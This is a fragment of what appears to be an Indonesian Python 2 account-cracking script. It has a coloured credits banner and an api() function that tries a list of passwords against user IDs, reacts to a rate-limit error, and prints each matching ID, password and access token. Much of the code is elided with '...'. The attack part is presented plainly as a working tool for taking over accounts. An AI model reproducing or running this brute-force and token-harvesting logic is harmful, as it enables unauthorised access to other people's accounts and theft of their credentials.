...
def info_tools():
    os.system('clear')
    logo()
    print ' %s\x1b[1;92m╠══[%s\x1b[1;93m#%s\x1b[1;92m]'%(N,O,N), 52 * '\x1b[1;92m-\x1b[0m';time.sleep(0.07)
    ...
    print ' %s\x1b[1;92m╠══[%s\x1b[1;93m#%s\x1b[1;92m]'%(N,O,N), 52 * '\x1b[1;93m-\x1b[0m';time.sleep(0.07)
    ...
    print ' %s\x1b[1;92m╠══[%s\x1b[1;93m#%s\x1b[1;92m]'%(N,O,N), 52 * '\x1b[1;93m-\x1b[0m';time.sleep(0.07)
    print ' %s\x1b[1;92m╠══[%s>%s\x1b[1;92m] \x1b[1;93m: Terimakasih kepada'%(N,H,N);time.sleep(0.07)
    print ' %s\x1b[1;92m╠══[%s>%s\x1b[1;92m]\n \x1b[1;92m: Author Script'%(N,H,N);time.sleep(0.07)
    print ' %s\x1b[1;92m╠══[%s>%s\x1b[1;92m] \x1b[1;93m: Sanz-Tzy'%(N,H,N);time.sleep(0.07)
    print ' %s\x1b[1;92m╠══[%s>%s\x1b[1;92m] \x1b[1;93m: Haris Ganz'%(N,H,N);time.sleep(0.07)
    print ' %s\x1b[1;92m╠══[%s>%s\x1b[1;92m]\n \x1b[1;92m: Team Script'%(N,H,N);time.sleep(0.07)
    print ' %s\x1b[1;92m╠══[%s>%s\x1b[1;92m] \x1b[1;93m: YumasaaTzy'%(N,H,N);time.sleep(0.07)
    print ' %s\x1b[1;92m╠══[%s>%s\x1b[1;92m] \x1b[1;93m: Mrjeeck X nano'%(N,H,N);time.sleep(0.07)
...
def api(uid, pwx):
	...
	for pw in pwx:
		...
		if "Calls to this api have exceeded the rate limit. (613)" in file_jason:
			...
			print("\r  %s[OK] %s|%s|%s"%(H,uid, pw, send.json()["access_"]))
